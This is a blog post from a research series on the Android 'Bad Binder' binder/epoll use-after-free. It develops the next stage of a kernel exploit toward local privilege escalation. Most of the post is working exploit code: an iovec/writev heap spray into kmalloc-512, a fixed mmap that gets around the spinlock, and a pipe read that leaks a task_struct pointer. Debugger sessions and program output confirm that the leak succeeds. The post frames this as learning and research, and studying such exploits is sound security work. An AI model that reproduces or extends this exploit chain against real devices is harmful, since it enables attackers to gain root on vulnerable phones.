# Bad Binder - Part 2 - Android Research Journey

In the last blog post about Bad Binder, we've successfully disected the CVE and have built a very basic POC that demonstrates the UAF. In this one, we will take it a step further towards LPE. This post, as well as the upcoming ones, assume knowledge in Linux Kernel exploitation in order to fluently understand everything.

To refresh our minds, the vulnerability we found is that when we `epoll` our `binder_thread` (and add our `binder_thread->wait` to an `eppoll_entry` object), and then destroy the `binder_thread`, the `eppoll_entry` object still points to the `binder_thread->wait`, and thus we have a UAF.

From the KASAN report we can also tell that the object allocated (the `binder_thread`) is in `kmalloc-512`.

Now, the first thing we most likely need to achieve here is a KASLR bypass, in order to do anything remotely interesting. That can potentially not be so tough, if we can, for example, use interesting leaks such as `msg_msg` (and `msgrcv()`). Forcing `msg_msg` to be allocated in the 512 bin is trivial, but we need to understand how we can write data. 

The first thing to understand is how `eppoll_entry->wait` is being written to, so we can understand what we can do. By checking for references, I have only seen two references to `eppoll_entry` (other than the one we know), and its in these functions:
```c
/*
 * This function unregisters poll callbacks from the associated file
 * descriptor.  Must be called with "mtx" held (or "epmutex" if called from
 * ep_free).
 */
static void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)
{
	struct list_head *lsthead = &epi->pwqlist;
	struct eppoll_entry *pwq;

	while (!list_empty(lsthead)) {
		pwq = list_first_entry(lsthead, struct eppoll_entry, llink);

		list_del(&pwq->llink);
		// --> this is actually the other function that 
		// --> has a reference to `eppoll_entry`.
		// --> making this the only effective function
		// --> to actually use for the UAF write.
		ep_remove_wait_queue(pwq);
		kmem_cache_free(pwq_cache, pwq);
	}
}

static void ep_remove_wait_queue(struct eppoll_entry *pwq)
{
	wait_queue_head_t *whead;

	rcu_read_lock();
	/*
	 * If it is cleared by POLLFREE, it should be rcu-safe.
	 * If we read NULL we need a barrier paired with
	 * smp_store_release() in ep_poll_callback(), otherwise
	 * we rely on whead->lock.
	 */
	whead = smp_load_acquire(&pwq->whead);
	if (whead)
		remove_wait_queue(whead, &pwq->wait);
	rcu_read_unlock();
}
```

In the end, this is simply the function that removes the poll wait, and they simply call `remove_wait_queue` on the `eppoll_entry->whead`:
```c
void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
	unsigned long flags;

	spin_lock_irqsave(&wq_head->lock, flags);
	__remove_wait_queue(wq_head, wq_entry);
	spin_unlock_irqrestore(&wq_head->lock, flags);
}

static inline void
__remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
	list_del(&wq_entry->entry);
}

static inline void list_del(struct list_head *entry)
{
	__list_del(entry->prev, entry->next);
	entry->next = LIST_POISON1;
	entry->prev = LIST_POISON2;
}

static inline void __list_del(struct list_head * prev, struct list_head * next)
{
	next->prev = prev;
	WRITE_ONCE(prev->next, next);
}
```

~~phew, fucking linux abstractions~~

Let's debug our kernel and check what happens exactly. We want to add to our POC a simple code that'll release our `binder_thread` from the queue, we can do that by calling the `CTL_DELETE` like so:
```c
epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
```

Now, if we stop at `remove_wait_queue`, and check out `wq_head` and `wq_entry`:
```c
pwndbg> p *wq_entry
$18 = {
  flags = 0,
  private = 0x0,
  func = 0xffff20000868f4a0 <ep_poll_callback>,
  entry = {
    next = 0xffff8000d72b8ad0,
    prev = 0xffff8000d72b8ad0
  }
}
pwndbg> p &wq_entry->entry
$19 = (struct list_head *) 0xffff8000d75a2098
pwndbg> p &wq_head->head
$20 = (struct list_head *) 0xffff8000d72b8ad0
pwndbg> p *(struct list_head*)wq_head->head
$21 = {
  next = 0xffff8000d72b8ad0,
  prev = 0xffff8000d72b8ad0
}
```

As we can see, the `wq_entry` is the ONLY entry in our wait queue, thus pointing back at the head, while the head also points back to it.

This means that when we access `wq_entry->next` and `wq_entry->prev`, we actually write to the `wq_head`. That means, that in `__list_del`, when we write, we actually write to `wq_head`. Now, this is useful for a write primitive, but let's focus on how we can use it for our advantage here instead.

Let's start by seeing in which offset the write happens exactly:
```c
❯ pahole binder_thread ~/vr/android/kernel/vmlinux
struct binder_thread {
        struct binder_proc *       proc;                 /*     0     8 */
        struct rb_node             rb_node;              /*     8    24 */
        struct list_head           waiting_thread_node;  /*    32    16 */
        int                        pid;                  /*    48     4 */
        int                        looper;               /*    52     4 */
        bool                       looper_need_return;   /*    56     1 */

        /* XXX 7 bytes hole, try to pack */

        /* --- cacheline 1 boundary (64 bytes) --- */
        struct binder_transaction * transaction_stack;   /*    64     8 */
        struct list_head           todo;                 /*    72    16 */
        bool                       process_todo;         /*    88     1 */

        /* XXX 7 bytes hole, try to pack */

        struct binder_error        return_error;         /*    96    32 */

        /* XXX last struct has 4 bytes of padding */

        /* --- cacheline 2 boundary (128 bytes) --- */
        struct binder_error        reply_error;          /*   128    32 */

        /* XXX last struct has 4 bytes of padding */

        struct binder_extended_error ee;                 /*   160    12 */

        /* XXX 4 bytes hole, try to pack */

        wait_queue_head_t          wait;                 /*   176    24 */
        /* --- cacheline 3 boundary (192 bytes) was 8 bytes ago --- */
        struct binder_stats        stats;                /*   200   244 */
        /* --- cacheline 6 boundary (384 bytes) was 60 bytes ago --- */
        atomic_t                   tmp_ref;              /*   444     4 */
        /* --- cacheline 7 boundary (448 bytes) --- */
        bool                       is_dead;              /*   448     1 */

        /* size: 456, cachelines: 8, members: 16 */
        /* sum members: 431, holes: 3, sum holes: 18 */
        /* padding: 7 */
        /* paddings: 2, sum paddings: 8 */
        /* last cacheline: 8 bytes */
};
```
That means `wait` is in offset `0xb0` (`&binder_thread + 0xb0`).

Two popular ways that I have heard about to leak KASLR are `msg_msg`, and `iovec`. `msg_msg` is unfortunately not helping us here due to the offset of `wait` being too large, while `iovec` might very much help us here (those who are familiar with `towelroot` might already recognize it).

To get a bit more knowledge on it, this is the `iovec` structure:
```c
struct iovec
{
    void *iov_base;	/* Pointer to data.  */
    size_t iov_len;	/* Length of data.  */
};
```

It is used in Vectored I/O, which is practically just a way of handling I/O data in a non-contiguous block of memory.

When you use `writev` for example, you pass it an array of `iovec` structs in user space, which are then allocated unto the kernel heap. This means that you have full control over the size of the `kmalloc` bin it falls into, as well as the fact this is an easy target for our high-offset writes due to the fact it will guaranteed to hit both `iov_base` and `iov_len` albeit not necessarily of the same `iovec`.

To use this, we must first allocate two pipes:
```c
int pipefd[2];
pipe(pipefd);
```

Fill them up:
```c
#define PIPE_CAPACITY 65536

uint8_t fill_buffer[PIPE_CAPACITY] = { 0, };

assert(PIPE_CAPACITY == write(pipefd[1], fill_buffer, PIPE_CAPACITY));
```

At this point, it's worth noting that the code above simply forces the pipe to be blocked in order for the `writev` call to block, forcing the kernel allocation to not be freed.

Now, at this point we want to create `iovec` allocations in order to reach `kmalloc-512`. The struct size is trivially 16, meaning we need `512/16 = 32` `iovec` objects. When testing I noticed that using 32 `iovec`s did not work to be allocated in `kmalloc-512`, so I simply used 24 instead, which did as they land in the 512 bucket.

Let's create them:
```c
#define NUM_IOVECS 24
#define BUFFER_SIZE 0x200

char buffer[BUFFER_SIZE];
struct iovec iov[NUM_IOVECS];

for (int i = 0; i < NUM_IOVECS; ++i)
{
    iov[i].iov_base = buffer;
    iov[i].iov_len = BUFFER_SIZE;
}
```

And now, we force the allocation using `writev`:
```c
writev(pipefd[1], iov, NUM_IOVECS);
```

Let's envision what will happen now. We have thread A and thread B. Our thread A has reached the point of the UAF, before forcing a write. At this point, we start thread B, which will force the allocation of the `iovec`s in the `kmalloc-512` object that we UAF. After it is hanging on `writev`, thread A continues and forces a write like we've seen before. It will write an address in `binder_thread` (namely, `binder_thread->wait->head`) into a `iov_base` and an `iov_len`. The one that interests us is the `iov_base`, as it forces the kernel to write data into the pipe from `binder_thread->wait->head`. Afterwards, we'll simply read from the pipe, letting `writev` finish hanging, and then we'll `read` the entire content until we reach the interesting `iovec` in which we'll have our leak.

If we look at `binder_thread` again:
```c
struct binder_thread {
	struct binder_proc *proc;
	struct rb_node rb_node;
	struct list_head waiting_thread_node;
	int pid;
	int looper;              /* only modified by this thread */
	bool looper_need_return; /* can be written by other thread */
	struct binder_transaction *transaction_stack;
	struct list_head todo;
	bool process_todo;
	struct binder_error return_error;
	struct binder_error reply_error;
	wait_queue_head_t wait;
	struct binder_stats stats;
	atomic_t tmp_ref;
	bool is_dead;
	struct task_struct *task;
};
```

We can see that after `wait` (which is where the `iov_base` will point to), there's a pointer to `task`. A freebie :)

Let's begin by first adding the following function to UAF:
```c
void *leak_uaf() {
  int pipefd[2];
  uint8_t fill_buffer[PIPE_CAPACITY] = {
      0,
  };
  char buffer[BUFFER_SIZE];
  struct iovec iov[NUM_IOVECS];

  // Create a pipe and fill it up to block.
  printf("[!] Filling pipes to block...\n");
  pipe(pipefd);
  assert(PIPE_CAPACITY == write(pipefd[1], fill_buffer, PIPE_CAPACITY));

  printf("[!] Creating %d iovecs...\n", NUM_IOVECS);
  for (int i = 0; i < NUM_IOVECS; ++i) {
    iov[i].iov_base = buffer;
    iov[i].iov_len = BUFFER_SIZE;
  }

  sleep(5);

  printf("[!] Entering blocked state...\n");
  writev(pipefd[1], iov, NUM_IOVECS);
  printf("[!] Left blocked state, it means we have signaled to not hang.\n");

  return NULL;
}
```

We then can add it to our code:
```c
int main() {
  int binder_fd, epoll_fd;
  pthread_t uaf_thread;

  assert(!pthread_create(&uaf_thread, NULL, leak_uaf, NULL));

  sleep(3);
  binder_fd = __initialize_binder();
  epoll_fd = __add_thread_to_waitqueue(binder_fd);
  __release_binder_thread(binder_fd);

  sleep(5);
  __del_waitqueue(epoll_fd, binder_fd);

  return EXIT_SUCCESS;
}
```

At this state we'll not read the contents yet. Let's see that it works using `pwndbg` (I actually found a bug in `pwndbg` due to this, and I submitted a PR to fix it, LOL).

We'll first set a breakpoint on `binder_thread_release` to see our `thread` address, and then on `import_iovec` (a function that copies the data from the userspace `iovec`s onto kernel-space):
```bash
pwndbg> p thread
$1 = (struct binder_thread *) 0xffff8000fa585e00
pwndbg> fin
pwndbg> slab info kmalloc-512
 Slab Cache @ 0xffff8000fb001c00
     Name: kmalloc-512
     Flags: (none)
     Offset: 0x0
     Slab size: 0x1000
     Size (including metadata): 0x200
     Align: 0x80
     Object Size: 0x200
     kmem_cache_cpu @ 0xffff8000fffdd750 [CPU 0]:
         Freelist: 0xffff8000fa585e00 [not within the slab]
         ...
```

As we can see, when we leave `binder_thread_release`, our `binder_thread` is the first on the freelist of the kmalloc-512 slub.

Now, let's ensure it is actually used:
```bash
pwndbg> x/30a 0xffff8000fa585e00
0xffff8000fa585e00:     0xffff8ebbecd8  0x200
0xffff8000fa585e10:     0xffff8ebbecd8  0x200
0xffff8000fa585e20:     0xffff8ebbecd8  0x200
0xffff8000fa585e30:     0xffff8ebbecd8  0x200
0xffff8000fa585e40:     0xffff8ebbecd8  0x200
0xffff8000fa585e50:     0xffff8ebbecd8  0x200
0xffff8000fa585e60:     0xffff8ebbecd8  0x200
0xffff8000fa585e70:     0xffff8ebbecd8  0x200
0xffff8000fa585e80:     0xffff8ebbecd8  0x200
0xffff8000fa585e90:     0xffff8ebbecd8  0x200
0xffff8000fa585ea0:     0xffff8ebbecd8  0x200
0xffff8000fa585eb0:     0xffff8ebbecd8  0x200
0xffff8000fa585ec0:     0xffff8ebbecd8  0x200
0xffff8000fa585ed0:     0xffff8ebbecd8  0x200
0xffff8000fa585ee0:     0xffff8ebbecd8  0x200
```

As we can see, it is exactly our `binder_thread` address, that is now filled with the `iovec` entries. Now, when we'll write the `prev` and `next`, we'll corrupt on `iov_base` and one `iov_len`.

Now we want to check that the write actually happens as we expect:
```bash
pwndbg> set $t = thread
pwndbg> c
... --> We did not free the wait queue yet...
pwndbg> x/30a $t
0xffff8000fa54f580:     0x100000000     0x200
0xffff8000fa54f590:     0x100000000     0x200
0xffff8000fa54f5a0:     0x100000000     0x200
0xffff8000fa54f5b0:     0x100000000     0x200
0xffff8000fa54f5c0:     0x100000000     0x200
0xffff8000fa54f5d0:     0x100000000     0x200
0xffff8000fa54f5e0:     0x100000000     0x200
0xffff8000fa54f5f0:     0x100000000     0x200
0xffff8000fa54f600:     0x100000000     0x200
0xffff8000fa54f610:     0x100000000     0x200
0xffff8000fa54f620:     0x100000000     0x200
0xffff8000fa54f630:     0x100000000     0x200
0xffff8000fa54f640:     0x100000000     0x200
0xffff8000fa54f650:     0x100000000     0x200
0xffff8000fa54f660:     0x100000000     0x200
pwndbg> b ep_remove_wait_queue
pwndbg> c
... --> Now we did:
pwndbg> fin
pwndbg> x/30a $t
0xffff8000fa54f580:     0x100000000     0x200
0xffff8000fa54f590:     0x100000000     0x200
0xffff8000fa54f5a0:     0x100000000     0x200
0xffff8000fa54f5b0:     0x100000000     0x200
0xffff8000fa54f5c0:     0x100000000     0x200
0xffff8000fa54f5d0:     0x100000000     0x200
0xffff8000fa54f5e0:     0x100000000     0x200
0xffff8000fa54f5f0:     0x100000000     0x200
0xffff8000fa54f600:     0x100000000     0x200
0xffff8000fa54f610:     0x100000000     0x200
0xffff8000fa54f620:     0x100010001     0xffff8000fa54f628
0xffff8000fa54f630:     0xffff8000fa54f628      0x200
0xffff8000fa54f640:     0x100000000     0x200
0xffff8000fa54f650:     0x100000000     0x200
0xffff8000fa54f660:     0x100000000     0x200
```

And, as we can see, we got kernel addresses in our `iovec` array. Note that the `iov_base` was changed to `0x100000000`. When debugging this, I noticed that the lower 4 bytes of the address were used as the `spinlock`. This caused problems as the `spinlock` was thought to be locked, so we needed an address in which the lower 4 bytes were 0. This introduced a slight change to our code then:
```c
// We need a buffer with the lower 4 bytes being 0
// due to the spinlock.
void *spray_buf = mmap((void *)0x100000000, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
assert(spray_buf == (void *)0x100000000);
```

And then we pass it to `iov_base` instead of the previous `buffer`. 

At this point, we're at a very good state where we know how to successfully perform the UAF write, but we have a problem.

If you look at the overwritten fields, we have first overwritten an `iov_len` (and its `iov_base` with a weird value?). This is not good to us, as we cannot make the kernel process it. It'll simply crash.

To solve this, we may abuse the way `writev` works with the `iovec`s. It processes each one of them, and writes it to the pipe, as long as the pipe is not filled. Also, if we null out both `iov_len` and `iov_base`, it'll simply ignore the `iovec` entry. In this case, we can forget about filling the pipe beforehand, and simply do something like that (note that we only care about the first 12 `iovec`s as the 12th `iovec` is the one whos base is overwritten):
```c
// We need a buffer with the lower 4 bytes being 0
// due to the spinlock.
void *fill_buf = mmap((void *)0x100000000, PIPE_CAPACITY, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
assert(fill_buf == (void *)0x100000000);

// Create a pipe and fill it up to block.
printf("[!] Filling pipes to block...\n");
pipe(pipefd);

printf("[!] Creating 12 iovecs...\n");

// After the 11th iovec is processed, the pipe should be blocked.
iov[10].iov_base = fill_buf;
iov[10].iov_len = PIPE_CAPACITY;

// This is the iovec we overwrite while we process the 11th iovec.
iov[11].iov_len = BUFFER_SIZE;
```

This simply only initializes only the `iovec`s we care about. Let's check it out and ensure it actually blocks:
```c
~ # ./poc
[!] Filling pipes to block...
[!] Filling the iovecs to be overwritten...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Entering blocked state...
```

All that's left now is, in the main thread, to call `read` and free the pipe so we can read the leak:
```c
#define TASK_STRUCT_OFFSET 0x1d

void *__leak_taskstruct(void) {
  uint64_t binder_thread_leak_buffer[BUFFER_SIZE / sizeof(uint64_t)];

  // First read the data we don't care about...
  int nbytes = read(pipefd[0], (void *)FILL_BUF_ADDR, PIPE_CAPACITY);
  assert(nbytes == PIPE_CAPACITY);

  // Now read the leak itself
  nbytes = read(pipefd[0], binder_thread_leak_buffer, BUFFER_SIZE);
  assert(nbytes == BUFFER_SIZE);

  void* task_struct_ptr = (void*)binder_thread_leak_buffer[TASK_STRUCT_OFFSET];
  printf("Leaked task_struct @ %p\n", task_struct_ptr);
  return task_struct_ptr;
}
```
Note: Make sure to disable SLUB_DEBUG in your kernel if you try to leak data here. If it's turned on, it'll corrupt the freed slub.

Let's run it all together and debug to verify. First, debug and break on `binder_thread_release`:
```bash
pwndbg> p *thread
$2 = {
  proc = 0xffff8000faab2800,
  rb_node = {
    __rb_parent_color = 0x1,
    rb_right = 0x0,
    rb_left = 0x0
  },
  waiting_thread_node = {
    next = 0xffff8000fa9f3620,
    prev = 0xffff8000fa9f3620
  },
  pid = 0x420,
  looper = 0x20,
  looper_need_return = 0x1,
  transaction_stack = 0x0,
  todo = {
    next = 0xffff8000fa9f3648,
    prev = 0xffff8000fa9f3648
  },
  process_todo = 0x0,
  return_error = {
    work = {
      entry = {
        next = 0x0,
        prev = 0x0
      },
      type = BINDER_WORK_RETURN_ERROR
    },
    cmd = 0x7201
  },
  reply_error = {
    work = {
      entry = {
        next = 0x0,
        prev = 0x0
      },
      type = BINDER_WORK_RETURN_ERROR
    },
    cmd = 0x7201
  },
  wait = {
    lock = {
      {
        rlock = {
          raw_lock = {
            owner = 0x1,
            next = 0x1
          }
        }
      }
    },
    task_list = {
      next = 0xffff8000faa47030,
      prev = 0xffff8000faa47030
    }
  },
  stats = {
    br = {{
        counter = 0x0
      } <repeats 18 times>},
    bc = {{
        counter = 0x0
      } <repeats 19 times>},
    obj_created = {{
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }},
    obj_deleted = {{
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }, {
        counter = 0x0
      }}
  },
  tmp_ref = {
    counter = 0x0
  },
  is_dead = 0x0,
  task = 0xffff8000faa60c80
}
```

Continue and observe the output of our exploit:
```bash
~ # ./poc
[!] Filling pipes to block...
[!] Filling the iovecs to be overwritten...
[!] Created `binder_thread` and `binder_proc`...
[!] Added wait of binder_thread to `epoll_entry`...
[!] Entering blocked state...
[!] Left blocked state, it means we have signaled to not hang.
Leaked task_struct @ 0xffff8000faa60c80
```

Successfully leaked `task_struct`, what may we do from now?

In the next entry, we'll achieve full LPE, and release a full POC to exploit it. This has been a very fun to write entry. `Till next time.
